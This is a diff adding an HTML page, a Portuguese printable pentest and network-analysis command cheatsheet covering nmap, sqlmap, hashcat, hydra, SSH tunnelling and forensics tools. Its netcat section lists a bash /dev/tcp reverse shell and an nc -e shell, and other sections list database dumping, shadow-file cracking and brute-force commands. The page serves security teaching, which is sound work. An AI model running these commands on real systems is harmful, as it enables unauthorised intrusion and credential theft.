@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cybersecurity Command Cheatsheet</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e1a;
+    --surface: #111827;
+    --surface2: #1a2235;
+    --border: #1e2d47;
+    --accent: #00d4aa;
+    --accent2: #3b82f6;
+    --accent3: #f59e0b;
+    --accent4: #ef4444;
+    --accent5: #a855f7;
+    --text: #e2e8f0;
+    --text-muted: #64748b;
+    --text-dim: #94a3b8;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Space Grotesk', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 10px;
+    line-height: 1.4;
+  }
+
+  .page {
+    width: 297mm;
+    min-height: 210mm;
+    padding: 8mm 10mm;
+    background: var(--bg);
+    position: relative;
+    overflow: hidden;
+  }
+
+  /* Background grid */
+  .page::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,212,170,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,212,170,0.03) 1px, transparent 1px);
+    background-size: 20px 20px;
+    pointer-events: none;
+  }
+
+  .header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 6mm;
+    padding-bottom: 4mm;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+  }
+
+  .header-left { display: flex; align-items: center; gap: 10px; }
+
+  .logo-icon {
+    width: 32px; height: 32px;
+    background: var(--accent);
+    border-radius: 6px;
+    display: flex; align-items: center; justify-content: center;
+    font-family: var(--mono);
+    font-weight: 700;
+    font-size: 14px;
+    color: var(--bg);
+    flex-shrink: 0;
+  }
+
+  .header-title {
+    font-size: 18px;
+    font-weight: 700;
+    letter-spacing: -0.5px;
+    color: white;
+  }
+
+  .header-title span { color: var(--accent); }
+
+  .header-sub {
+    font-size: 9px;
+    color: var(--text-muted);
+    font-family: var(--mono);
+    letter-spacing: 0.05em;
+  }
+
+  .header-right {
+    display: flex;
+    gap: 6px;
+    align-items: center;
+  }
+
+  .phase-badge {
+    font-size: 8px;
+    font-family: var(--mono);
+    padding: 2px 7px;
+    border-radius: 3px;
+    font-weight: 500;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+  }
+
+  .p-recon { background: rgba(59,130,246,0.15); color: #60a5fa; border: 1px solid rgba(59,130,246,0.3); }
+  .p-scan { background: rgba(0,212,170,0.15); color: var(--accent); border: 1px solid rgba(0,212,170,0.3); }
+  .p-exploit { background: rgba(239,68,68,0.15); color: #f87171; border: 1px solid rgba(239,68,68,0.3); }
+  .p-post { background: rgba(168,85,247,0.15); color: #c084fc; border: 1px solid rgba(168,85,247,0.3); }
+  .p-defense { background: rgba(245,158,11,0.15); color: #fbbf24; border: 1px solid rgba(245,158,11,0.3); }
+  .p-forensic { background: rgba(236,72,153,0.15); color: #f472b6; border: 1px solid rgba(236,72,153,0.3); }
+
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 4px;
+  }
+
+  .section {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 5px 7px;
+    break-inside: avoid;
+  }
+
+  .section.wide { grid-column: span 2; }
+  .section.full { grid-column: span 4; }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    margin-bottom: 4px;
+    padding-bottom: 3px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-icon {
+    width: 14px; height: 14px;
+    border-radius: 3px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 8px;
+    flex-shrink: 0;
+  }
+
+  .icon-nmap { background: rgba(59,130,246,0.2); color: #60a5fa; }
+  .icon-nmap-adv { background: rgba(59,130,246,0.2); color: #60a5fa; }
+  .icon-wire { background: rgba(168,85,247,0.2); color: #c084fc; }
+  .icon-metasploit { background: rgba(239,68,68,0.2); color: #f87171; }
+  .icon-netcat { background: rgba(0,212,170,0.2); color: var(--accent); }
+  .icon-gobuster { background: rgba(245,158,11,0.2); color: #fbbf24; }
+  .icon-sqlmap { background: rgba(239,68,68,0.2); color: #f87171; }
+  .icon-john { background: rgba(168,85,247,0.2); color: #c084fc; }
+  .icon-hashcat { background: rgba(168,85,247,0.2); color: #c084fc; }
+  .icon-hydra { background: rgba(236,72,153,0.2); color: #f472b6; }
+  .icon-curl { background: rgba(0,212,170,0.2); color: var(--accent); }
+  .icon-openssl { background: rgba(245,158,11,0.2); color: #fbbf24; }
+  .icon-tcpdump { background: rgba(59,130,246,0.2); color: #60a5fa; }
+  .icon-ssh { background: rgba(0,212,170,0.2); color: var(--accent); }
+  .icon-iptables { background: rgba(239,68,68,0.2); color: #f87171; }
+  .icon-linux { background: rgba(245,158,11,0.2); color: #fbbf24; }
+  .icon-net { background: rgba(59,130,246,0.2); color: #60a5fa; }
+  .icon-file { background: rgba(0,212,170,0.2); color: var(--accent); }
+
+  .section-title {
+    font-size: 9px;
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: white;
+    flex: 1;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+  }
+
+  tr { border-bottom: 1px solid rgba(30,45,71,0.5); }
+  tr:last-child { border-bottom: none; }
+
+  td {
+    padding: 1.5px 0;
+    vertical-align: top;
+    font-size: 8.5px;
+  }
+
+  td:first-child {
+    font-family: var(--mono);
+    font-weight: 500;
+    color: var(--accent);
+    white-space: nowrap;
+    padding-right: 6px;
+    width: 50%;
+  }
+
+  td:last-child {
+    color: var(--text-dim);
+    line-height: 1.3;
+  }
+
+  .flag { color: var(--accent3); font-family: var(--mono); }
+  .val { color: #93c5fd; font-family: var(--mono); }
+
+  .note {
+    font-size: 7.5px;
+    color: var(--text-muted);
+    font-family: var(--mono);
+    margin-top: 3px;
+    padding: 2px 4px;
+    background: rgba(255,255,255,0.03);
+    border-radius: 3px;
+    border-left: 2px solid var(--accent3);
+  }
+
+  .footer {
+    margin-top: 5mm;
+    padding-top: 3mm;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .footer-text {
+    font-size: 7.5px;
+    color: var(--text-muted);
+    font-family: var(--mono);
+  }
+
+  .footer-text span { color: var(--accent); }
+
+  .legend {
+    display: flex;
+    gap: 8px;
+    align-items: center;
+  }
+
+  .legend-item {
+    display: flex;
+    align-items: center;
+    gap: 3px;
+    font-size: 7px;
+    color: var(--text-muted);
+    font-family: var(--mono);
+  }
+
+  .legend-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+  }
+
+  @media print {
+    body { background: var(--bg) !important; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    .page { width: 297mm; padding: 8mm 10mm; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <div class="header">
+    <div class="header-left">
+      <div class="logo-icon">$_</div>
+      <div>
+        <div class="header-title">Cyber<span>Sec</span> Cheatsheet</div>
+        <div class="header-sub">COMANDOS ESSENCIAIS · PENTEST & ANÁLISE DE REDES · v1.0</div>
+      </div>
+    </div>
+    <div class="header-right">
+      <span class="phase-badge p-recon">Recon</span>
+      <span class="phase-badge p-scan">Scan</span>
+      <span class="phase-badge p-exploit">Exploit</span>
+      <span class="phase-badge p-post">Post-Exploit</span>
+      <span class="phase-badge p-defense">Defesa</span>
+      <span class="phase-badge p-forensic">Forense</span>
+    </div>
+  </div>
+
+  <div class="grid">
+
+    <!-- NMAP BÁSICO -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-nmap">N</div>
+        <span class="section-title">Nmap — Básico</span>
+        <span class="phase-badge p-scan">Scan</span>
+      </div>
+      <table>
+        <tr><td>nmap <val>IP</val></td><td>Scan básico top 1000 portas</td></tr>
+        <tr><td>nmap <flag>-sV</flag> <val>IP</val></td><td>Detecta versões de serviços</td></tr>
+        <tr><td>nmap <flag>-sC</flag> <val>IP</val></td><td>Scripts padrão NSE</td></tr>
+        <tr><td>nmap <flag>-A</flag> <val>IP</val></td><td>OS, versão, scripts, traceroute</td></tr>
+        <tr><td>nmap <flag>-p-</flag> <val>IP</val></td><td>Todas as 65535 portas</td></tr>
+        <tr><td>nmap <flag>-p</flag> <val>22,80,443</val> <val>IP</val></td><td>Portas específicas</td></tr>
+        <tr><td>nmap <flag>-sU</flag> <val>IP</val></td><td>Scan UDP</td></tr>
+        <tr><td>nmap <flag>-Pn</flag> <val>IP</val></td><td>Skip ping (host pode estar UP)</td></tr>
+      </table>
+    </div>
+
+    <!-- NMAP AVANÇADO -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-nmap-adv">N+</div>
+        <span class="section-title">Nmap — Avançado</span>
+        <span class="phase-badge p-scan">Scan</span>
+      </div>
+      <table>
+        <tr><td>nmap <flag>-sS</flag> <val>IP</val></td><td>SYN Stealth scan (root)</td></tr>
+        <tr><td>nmap <flag>-O</flag> <val>IP</val></td><td>Detecção de OS</td></tr>
+        <tr><td>nmap <flag>-T4</flag> <val>IP</val></td><td>Velocidade agressiva (T0-T5)</td></tr>
+        <tr><td>nmap <flag>--script vuln</flag> <val>IP</val></td><td>Scan de vulnerabilidades</td></tr>
+        <tr><td>nmap <flag>-oN</flag> <val>output.txt IP</val></td><td>Guardar resultado</td></tr>
+        <tr><td>nmap <flag>-oX</flag> <val>out.xml IP</val></td><td>Output XML</td></tr>
+        <tr><td>nmap <flag>--open</flag> <val>IP</val></td><td>Só portas abertas</td></tr>
+        <tr><td>nmap <flag>-sn</flag> <val>192.168.1.0/24</val></td><td>Host discovery (ping sweep)</td></tr>
+      </table>
+    </div>
+
+    <!-- WIRESHARK / TSHARK -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-wire">W</div>
+        <span class="section-title">Wireshark / tshark</span>
+        <span class="phase-badge p-forensic">Forense</span>
+      </div>
+      <table>
+        <tr><td>tshark <flag>-i</flag> <val>eth0</val></td><td>Capturar em interface</td></tr>
+        <tr><td>tshark <flag>-r</flag> <val>file.pcap</val></td><td>Ler ficheiro pcap</td></tr>
+        <tr><td>tshark <flag>-Y</flag> <val>"http"</val></td><td>Filtro de display</td></tr>
+        <tr><td><flag>tcp.port==80</flag></td><td>Filtro: porta HTTP</td></tr>
+        <tr><td><flag>ip.src==</flag><val>192.168.1.1</val></td><td>Filtro por IP origem</td></tr>
+        <tr><td><flag>http.request</flag></td><td>Só pedidos HTTP</td></tr>
+        <tr><td><flag>dns</flag></td><td>Filtrar tráfego DNS</td></tr>
+        <tr><td>tshark <flag>-w</flag> <val>cap.pcap</val></td><td>Gravar captura</td></tr>
+      </table>
+    </div>
+
+    <!-- NETCAT -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-netcat">NC</div>
+        <span class="section-title">Netcat (nc)</span>
+        <span class="phase-badge p-exploit">Exploit</span>
+      </div>
+      <table>
+        <tr><td>nc <val>IP PORT</val></td><td>Ligar a host:porta</td></tr>
+        <tr><td>nc <flag>-lvnp</flag> <val>4444</val></td><td>Listener (receber reverse shell)</td></tr>
+        <tr><td>nc <flag>-zv</flag> <val>IP 1-1000</val></td><td>Port scan rápido</td></tr>
+        <tr><td>nc <flag>-e /bin/bash</flag> <val>IP P</val></td><td>Enviar shell (bind)</td></tr>
+        <tr><td>nc <flag>-u</flag> <val>IP PORT</val></td><td>Modo UDP</td></tr>
+        <tr><td>nc <flag>-w3</flag> <val>IP PORT</val></td><td>Timeout 3 segundos</td></tr>
+        <tr><td>bash <flag>-i &gt;&amp; /dev/tcp/</flag><val>IP/P</val> <flag>0&gt;&amp;1</flag></td><td>Bash reverse shell</td></tr>
+      </table>
+      <div class="note">⚠ nc -e pode não estar disponível em todas as distros</div>
+    </div>
+
+    <!-- GOBUSTER / FFUF -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-gobuster">GB</div>
+        <span class="section-title">Gobuster / ffuf</span>
+        <span class="phase-badge p-recon">Recon</span>
+      </div>
+      <table>
+        <tr><td>gobuster dir <flag>-u</flag> <val>URL</val> <flag>-w</flag> <val>wl.txt</val></td><td>Dir bruteforce</td></tr>
+        <tr><td>gobuster dns <flag>-d</flag> <val>dom</val> <flag>-w</flag> <val>wl</val></td><td>Subdomínios</td></tr>
+        <tr><td>gobuster dir <flag>-x</flag> <val>php,html</val></td><td>Extensões específicas</td></tr>
+        <tr><td>ffuf <flag>-u</flag> <val>URL/FUZZ</val> <flag>-w</flag> <val>wl</val></td><td>Fuzzing com ffuf</td></tr>
+        <tr><td>ffuf <flag>-fc 404</flag></td><td>Filtrar 404s</td></tr>
+        <tr><td>ffuf <flag>-mc 200,301</flag></td><td>Só status 200/301</td></tr>
+        <tr><td>ffuf <flag>-H</flag> <val>"Host: FUZZ.dom"</val></td><td>Virtual host fuzzing</td></tr>
+      </table>
+    </div>
+
+    <!-- SQLMAP -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-sqlmap">SQL</div>
+        <span class="section-title">SQLMap</span>
+        <span class="phase-badge p-exploit">Exploit</span>
+      </div>
+      <table>
+        <tr><td>sqlmap <flag>-u</flag> <val>"URL?id=1"</val></td><td>Teste básico de SQLi</td></tr>
+        <tr><td>sqlmap <flag>-u</flag> <val>URL</val> <flag>--dbs</flag></td><td>Listar bases de dados</td></tr>
+        <tr><td>sqlmap <flag>-D</flag> <val>db</val> <flag>--tables</flag></td><td>Listar tabelas</td></tr>
+        <tr><td>sqlmap <flag>-T</flag> <val>users</val> <flag>--dump</flag></td><td>Extrair dados da tabela</td></tr>
+        <tr><td>sqlmap <flag>--forms</flag> <flag>-u</flag> <val>URL</val></td><td>Auto-detectar forms</td></tr>
+        <tr><td>sqlmap <flag>--level=5</flag> <flag>--risk=3</flag></td><td>Teste intensivo</td></tr>
+        <tr><td>sqlmap <flag>--cookie=</flag><val>"sess=abc"</val></td><td>Com cookie de sessão</td></tr>
+      </table>
+    </div>
+
+    <!-- JOHN + HASHCAT -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-john">JH</div>
+        <span class="section-title">John the Ripper</span>
+        <span class="phase-badge p-post">Post</span>
+      </div>
+      <table>
+        <tr><td>john <val>hashes.txt</val></td><td>Crack com wordlist padrão</td></tr>
+        <tr><td>john <flag>--wordlist=</flag><val>rockyou.txt</val> <val>h</val></td><td>Wordlist custom</td></tr>
+        <tr><td>john <flag>--format=</flag><val>md5</val> <val>h</val></td><td>Especificar formato</td></tr>
+        <tr><td>john <flag>--show</flag> <val>hashes.txt</val></td><td>Mostrar passwords crackadas</td></tr>
+        <tr><td>john <flag>--rules</flag> <flag>--wordlist=</flag><val>wl</val></td><td>Regras de mutação</td></tr>
+        <tr><td>unshadow <val>/etc/passwd /etc/shadow</val></td><td>Preparar ficheiro shadow</td></tr>
+      </table>
+    </div>
+
+    <!-- HASHCAT -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-hashcat">HC</div>
+        <span class="section-title">Hashcat</span>
+        <span class="phase-badge p-post">Post</span>
+      </div>
+      <table>
+        <tr><td>hashcat <flag>-m 0</flag> <val>h.txt wl.txt</val></td><td>MD5 + wordlist</td></tr>
+        <tr><td>hashcat <flag>-m 1000</flag> <val>h wl</val></td><td>NTLM (Windows)</td></tr>
+        <tr><td>hashcat <flag>-m 1800</flag> <val>h wl</val></td><td>SHA-512 (Linux shadow)</td></tr>
+        <tr><td>hashcat <flag>-a 3</flag> <flag>-m 0</flag> <val>h ?a?a?a?a</val></td><td>Brute force 4 chars</td></tr>
+        <tr><td>hashcat <flag>--show</flag> <val>h.txt</val></td><td>Ver resultados</td></tr>
+        <tr><td>hashcat <flag>-m 0</flag> <flag>--example-hashes</flag></td><td>Exemplos de hash MD5</td></tr>
+      </table>
+    </div>
+
+    <!-- HYDRA -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-hydra">HY</div>
+        <span class="section-title">Hydra — Brute Force</span>
+        <span class="phase-badge p-exploit">Exploit</span>
+      </div>
+      <table>
+        <tr><td>hydra <flag>-l</flag> <val>admin</val> <flag>-P</flag> <val>wl.txt</val> <val>IP ssh</val></td><td>SSH bruteforce</td></tr>
+        <tr><td>hydra <flag>-L</flag> <val>users.txt</val> <flag>-P</flag> <val>wl IP</val> <val>ftp</val></td><td>FTP com lista users</td></tr>
+        <tr><td>hydra <flag>-l</flag> <val>admin</val> <flag>-P</flag> <val>wl</val> <val>IP http-get /</val></td><td>HTTP Basic Auth</td></tr>
+        <tr><td>hydra <flag>-t 4</flag></td><td>Limitar a 4 threads</td></tr>
+        <tr><td>hydra <flag>-s 8080</flag></td><td>Porta alternativa</td></tr>
+        <tr><td>hydra <flag>-V</flag></td><td>Verbose (ver tentativas)</td></tr>
+      </table>
+    </div>
+
+    <!-- CURL / WEB -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-curl">CL</div>
+        <span class="section-title">Curl — Web Recon</span>
+        <span class="phase-badge p-recon">Recon</span>
+      </div>
+      <table>
+        <tr><td>curl <flag>-I</flag> <val>URL</val></td><td>Só headers HTTP</td></tr>
+        <tr><td>curl <flag>-X POST -d</flag> <val>"data"</val> <val>URL</val></td><td>POST request</td></tr>
+        <tr><td>curl <flag>-b</flag> <val>"cookie=val"</val> <val>URL</val></td><td>Com cookie</td></tr>
+        <tr><td>curl <flag>-H</flag> <val>"Auth: Bearer TOKEN"</val></td><td>Header custom</td></tr>
+        <tr><td>curl <flag>-k</flag> <val>URL</val></td><td>Ignorar SSL inválido</td></tr>
+        <tr><td>curl <flag>-L</flag> <val>URL</val></td><td>Seguir redirects</td></tr>
+        <tr><td>curl <flag>--proxy</flag> <val>127.0.0.1:8080</val></td><td>Via proxy (Burp)</td></tr>
+      </table>
+    </div>
+
+    <!-- OPENSSL -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-openssl">SSL</div>
+        <span class="section-title">OpenSSL</span>
+        <span class="phase-badge p-defense">Defesa</span>
+      </div>
+      <table>
+        <tr><td>openssl s_client <flag>-connect</flag> <val>IP:443</val></td><td>Inspecionar certificado</td></tr>
+        <tr><td>openssl x509 <flag>-in cert.pem -text</flag></td><td>Detalhes do certificado</td></tr>
+        <tr><td>openssl genrsa <flag>-out key.pem 2048</flag></td><td>Gerar chave RSA</td></tr>
+        <tr><td>openssl req <flag>-new -key key.pem</flag></td><td>Criar CSR</td></tr>
+        <tr><td>openssl enc <flag>-aes-256-cbc -in f -out f.enc</flag></td><td>Encriptar ficheiro</td></tr>
+        <tr><td>openssl dgst <flag>-sha256</flag> <val>file</val></td><td>Hash SHA256</td></tr>
+      </table>
+    </div>
+
+    <!-- TCPDUMP -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-tcpdump">TD</div>
+        <span class="section-title">tcpdump</span>
+        <span class="phase-badge p-forensic">Forense</span>
+      </div>
+      <table>
+        <tr><td>tcpdump <flag>-i</flag> <val>eth0</val></td><td>Capturar em interface</td></tr>
+        <tr><td>tcpdump <flag>-w</flag> <val>cap.pcap</val></td><td>Gravar para ficheiro</td></tr>
+        <tr><td>tcpdump <flag>-r</flag> <val>cap.pcap</val></td><td>Ler pcap</td></tr>
+        <tr><td>tcpdump <flag>host</flag> <val>192.168.1.1</val></td><td>Filtrar por host</td></tr>
+        <tr><td>tcpdump <flag>port</flag> <val>80</val></td><td>Filtrar por porta</td></tr>
+        <tr><td>tcpdump <flag>-n -v</flag></td><td>Não resolver nomes, verbose</td></tr>
+        <tr><td>tcpdump <flag>src</flag> <val>IP</val> <flag>and port</flag> <val>443</val></td><td>Combinação de filtros</td></tr>
+      </table>
+    </div>
+
+    <!-- SSH / TUNNELING -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-ssh">SSH</div>
+        <span class="section-title">SSH & Tunneling</span>
+        <span class="phase-badge p-post">Post</span>
+      </div>
+      <table>
+        <tr><td>ssh <val>user@IP</val></td><td>Ligação básica</td></tr>
+        <tr><td>ssh <flag>-i</flag> <val>key.pem user@IP</val></td><td>Com chave privada</td></tr>
+        <tr><td>ssh <flag>-L</flag> <val>8080:localhost:80 user@IP</val></td><td>Local port forward</td></tr>
+        <tr><td>ssh <flag>-R</flag> <val>9090:localhost:22 user@IP</val></td><td>Remote port forward</td></tr>
+        <tr><td>ssh <flag>-D</flag> <val>1080 user@IP</val></td><td>SOCKS proxy dinâmico</td></tr>
+        <tr><td>ssh-keygen <flag>-t rsa -b 4096</flag></td><td>Gerar par de chaves</td></tr>
+        <tr><td>ssh-copy-id <val>user@IP</val></td><td>Copiar chave pública</td></tr>
+      </table>
+    </div>
+
+    <!-- LINUX PRIV-ESC -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-linux">PE</div>
+        <span class="section-title">Linux — Priv Escalation</span>
+        <span class="phase-badge p-post">Post</span>
+      </div>
+      <table>
+        <tr><td>sudo <flag>-l</flag></td><td>O que posso correr como root</td></tr>
+        <tr><td>find / <flag>-perm -4000 2>/dev/null</flag></td><td>Binários SUID</td></tr>
+        <tr><td>cat <val>/etc/crontab</val></td><td>Tarefas agendadas</td></tr>
+        <tr><td>cat <val>/etc/passwd</val></td><td>Utilizadores do sistema</td></tr>
+        <tr><td>uname <flag>-a</flag></td><td>Info do kernel</td></tr>
+        <tr><td>id; whoami; hostname</td><td>Info do utilizador actual</td></tr>
+        <tr><td>env; printenv</td><td>Variáveis de ambiente</td></tr>
+        <tr><td>ps aux</td><td>Processos a correr</td></tr>
+      </table>
+    </div>
+
+    <!-- IPTABLES -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-iptables">FW</div>
+        <span class="section-title">iptables — Firewall</span>
+        <span class="phase-badge p-defense">Defesa</span>
+      </div>
+      <table>
+        <tr><td>iptables <flag>-L -n -v</flag></td><td>Listar regras activas</td></tr>
+        <tr><td>iptables <flag>-A INPUT -p tcp --dport</flag> <val>22 -j ACCEPT</val></td><td>Permitir SSH</td></tr>
+        <tr><td>iptables <flag>-A INPUT -s</flag> <val>IP -j DROP</val></td><td>Bloquear IP</td></tr>
+        <tr><td>iptables <flag>-P INPUT DROP</flag></td><td>Default deny tráfego entrada</td></tr>
+        <tr><td>iptables <flag>-F</flag></td><td>Limpar todas as regras</td></tr>
+        <tr><td>iptables-save <flag>&gt;</flag> <val>rules.v4</val></td><td>Guardar regras</td></tr>
+      </table>
+    </div>
+
+    <!-- NETWORK COMMANDS -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-net">NET</div>
+        <span class="section-title">Rede — Diagnóstico</span>
+        <span class="phase-badge p-recon">Recon</span>
+      </div>
+      <table>
+        <tr><td>ip addr show</td><td>Interfaces e IPs</td></tr>
+        <tr><td>ip route</td><td>Tabela de routing</td></tr>
+        <tr><td>ss <flag>-tulnp</flag></td><td>Portas e processos activos</td></tr>
+        <tr><td>netstat <flag>-an</flag></td><td>Ligações activas</td></tr>
+        <tr><td>whois <val>domain.com</val></td><td>Info de domínio/IP</td></tr>
+        <tr><td>dig <val>domain.com</val> <flag>ANY</flag></td><td>DNS lookup completo</td></tr>
+        <tr><td>traceroute <val>IP</val></td><td>Rota até ao destino</td></tr>
+        <tr><td>arp <flag>-a</flag></td><td>Tabela ARP local</td></tr>
+      </table>
+    </div>
+
+    <!-- FILE / FORENSICS -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-icon icon-file">FS</div>
+        <span class="section-title">Ficheiros & Forense</span>
+        <span class="phase-badge p-forensic">Forense</span>
+      </div>
+      <table>
+        <tr><td>file <val>suspicious</val></td><td>Tipo real do ficheiro</td></tr>
+        <tr><td>strings <val>binary</val></td><td>Strings legíveis em binário</td></tr>
+        <tr><td>xxd <val>file</val> | head</td><td>Hex dump do ficheiro</td></tr>
+        <tr><td>md5sum / sha256sum <val>f</val></td><td>Hash para verificação</td></tr>
+        <tr><td>exiftool <val>image.jpg</val></td><td>Metadados de ficheiros</td></tr>
+        <tr><td>binwalk <val>firmware.bin</val></td><td>Análise de firmware</td></tr>
+        <tr><td>steghide extract <flag>-sf</flag> <val>img</val></td><td>Extrair steganografia</td></tr>
+        <tr><td>find / <flag>-name "*.log" 2>/dev/null</flag></td><td>Encontrar logs</td></tr>
+      </table>
+    </div>
+
+  </div>
+
+  <div class="footer">
+    <div class="footer-text">
+      <span>Cybersec Cheatsheet</span> · Uso ético e educacional apenas · Só usar em sistemas com autorização
+    </div>
+    <div class="legend">
+      <div class="legend-item"><div class="legend-dot" style="background:#60a5fa"></div>Recon</div>
+      <div class="legend-item"><div class="legend-dot" style="background:#00d4aa"></div>Scan</div>
+      <div class="legend-item"><div class="legend-dot" style="background:#f87171"></div>Exploit</div>
+      <div class="legend-item"><div class="legend-dot" style="background:#c084fc"></div>Post-Exploit</div>
+      <div class="legend-item"><div class="legend-dot" style="background:#fbbf24"></div>Defesa</div>
+      <div class="legend-item"><div class="legend-dot" style="background:#f472b6"></div>Forense</div>
+    </div>
+    <div class="footer-text">v1.0 · 2025 · <span>A4 Landscape</span></div>
+  </div>
+
+</div>
+</body>
+</html>
